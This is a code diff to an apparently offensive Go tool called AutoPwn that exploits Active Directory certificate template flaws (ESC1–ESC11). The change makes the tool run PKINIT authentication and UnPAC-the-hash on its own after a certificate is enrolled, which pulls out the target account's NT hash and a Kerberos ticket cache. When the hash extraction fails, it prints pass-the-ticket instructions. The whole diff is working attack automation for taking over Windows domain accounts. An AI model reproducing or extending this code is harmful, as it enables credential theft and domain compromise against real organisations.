@@ -29,6 +29,8 @@ type AutoPwnResult struct {
 	CertPath     string `json:"cert_path,omitempty"`
 	KeyPath      string `json:"key_path,omitempty"`
 	PFXPath      string `json:"pfx_path,omitempty"`
+	CcachePath   string `json:"ccache_path,omitempty"`   // ccache from PKINIT
+	NTHash       string `json:"nt_hash,omitempty"`       // from UnPAC-the-hash
 	RelayCommand string `json:"relay_command,omitempty"` // for ESC8/ESC11
 }
 
@@ -108,7 +110,9 @@ func AutoPwn(cfg *AutoPwnConfig) (*AutoPwnResult, error) {
 			upnUser = upnUser[:idx]
 		}
 		fmt.Println()
-		PrintPKINITCommands(&PKINITInfo{
+		fmt.Println("[*] After exploitation, PKINIT will run automatically.")
+		fmt.Println("[*] External tool alternative:")
+		PrintPKINITGuidance(&PKINITInfo{
 			CertPath:  filepath.Join(cfg.OutputDir, upnUser+".crt"),
 			KeyPath:   filepath.Join(cfg.OutputDir, upnUser+".key"),
 			PFXPath:   filepath.Join(cfg.OutputDir, upnUser+".pfx"),
@@ -163,19 +167,55 @@ func AutoPwn(cfg *AutoPwnConfig) (*AutoPwnResult, error) {
 			continue
 		}
 
-		// Step 6: Print PKINIT + UnPAC commands for next step
+		// Step 6: Attempt PKINIT + UnPAC-the-hash using the enrolled certificate
 		fmt.Printf("\n[+] AutoPwn SUCCESS via %s on template %q\n\n", c.escType, c.templateName)
-		PrintPKINITCommands(&PKINITInfo{
-			CertPath:  result.CertPath,
-			KeyPath:   result.KeyPath,
-			PFXPath:   result.PFXPath,
-			PFXPass:   "",
+
+		// Try real PKINIT authentication
+		pkinitResult, pkinitErr := PKINITAuth(&PKINITConfig{
+			Cert:      cert,
+			Key:       key,
 			DC:        cfg.TargetDC,
 			Domain:    cfg.Domain,
-			TargetUPN: cfg.TargetUPN,
+			UPN:       cfg.TargetUPN,
+			OutputDir: cfg.OutputDir,
 		})
-		if result.PFXPath != "" {
-			PrintUnPACCommands(result.PFXPath, "", cfg.TargetDC, cfg.Domain, cfg.TargetUPN)
+		if pkinitErr != nil {
+			fmt.Printf("[!] Built-in PKINIT failed: %v\n", pkinitErr)
+			fmt.Println("[*] Falling back to external tool guidance:")
+			PrintPKINITGuidance(&PKINITInfo{
+				CertPath: result.CertPath, KeyPath: result.KeyPath,
+				PFXPath: result.PFXPath, DC: cfg.TargetDC,
+				Domain: cfg.Domain, TargetUPN: cfg.TargetUPN,
+			})
+			if result.PFXPath != "" {
+				PrintUnPACGuidance(result.PFXPath, "", cfg.TargetDC, cfg.Domain, cfg.TargetUPN)
+			}
+			return result, nil
+		}
+
+		result.CcachePath = pkinitResult.CcachePath
+
+		// Try UnPAC-the-hash to extract NT hash
+		upnUser := cfg.TargetUPN
+		if idx := strings.Index(upnUser, "@"); idx > 0 {
+			upnUser = upnUser[:idx]
+		}
+		unpacResult, unpacErr := UnPACTheHash(&UnPACConfig{
+			TGTRaw:     pkinitResult.TGTRaw,
+			SessionKey: pkinitResult.SessionKey,
+			Etype:      pkinitResult.Etype,
+			ReplyKey:   pkinitResult.ReplyKey,
+			ReplyEtype: pkinitResult.ReplyEtype,
+			DC:         cfg.TargetDC,
+			Domain:     cfg.Domain,
+			Username:   upnUser,
+		})
+		if unpacErr != nil {
+			fmt.Printf("[!] UnPAC-the-hash failed: %v\n", unpacErr)
+			fmt.Println("[*] TGT is still valid — use pass-the-ticket:")
+			fmt.Printf("    export KRB5CCNAME=%s\n", pkinitResult.CcachePath)
+		} else {
+			result.NTHash = unpacResult.NTHash
 		}
 
 		return result, nil
